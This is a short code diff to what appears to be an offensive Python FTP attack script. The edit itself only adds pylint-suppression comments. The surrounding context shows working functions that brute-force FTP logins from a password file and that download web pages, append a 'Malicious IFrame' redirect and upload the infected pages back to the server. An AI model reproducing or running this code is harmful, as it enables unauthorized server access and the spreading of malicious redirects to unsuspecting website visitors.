@@ -20,7 +20,7 @@ def anonLogin(ip):
 def bruteLogin(ip, passwdFile):
     ''' brute login'''
     try:
-        pF = open(passwdFile, 'r', encoding='utf-8-sig')
+        pF = open(passwdFile, 'r', encoding='utf-8-sig')# pylint: disable=R1732
     except Exception as e:
         print('[-] File Not Found: ' + str(e))
         return None
@@ -59,13 +59,13 @@ def returnDefault(ftp):
 
 def injectPage(ftp, page, redirect):
     ''' inject the redirect page'''
-    f = open(page + '.tmp', 'w', encoding='utf-8-sig')
+    f = open(page + '.tmp', 'w', encoding='utf-8-sig') # pylint: disable=R1732
     ftp.retrlines('RETR ' + page, f.write)
     print('[+] Downloaded Page: ' + page)
     f.write(redirect)
     f.close()
     print('[+] Injected Malicious IFrame on: ' + page)
-    ftp.storlines('STOR ' + page, open(page + '.tmp', 'r', encoding='utf-8-sig'))
+    ftp.storlines('STOR ' + page, open(page + '.tmp', 'r', encoding='utf-8-sig')) # pylint: disable=R1732
     print('[+] Uploaded Injected Page: ' + page)
 
 def attack(username, password, tgtHost, redirect):
